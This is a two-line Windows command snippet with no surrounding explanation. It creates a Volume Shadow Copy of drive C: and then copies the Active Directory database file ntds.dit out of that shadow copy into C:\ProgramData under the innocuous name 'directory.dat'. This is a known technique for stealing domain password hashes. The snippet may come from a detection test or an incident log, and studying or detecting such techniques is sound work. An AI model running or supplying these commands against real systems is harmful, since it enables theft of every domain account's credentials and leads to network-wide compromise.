vssadmin.exe create shadow /for=C:
Copy-Item -LiteralPath "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12\Windows\NTDS\ntds.dit" -Destination "C:\ProgramData\directory.dat"
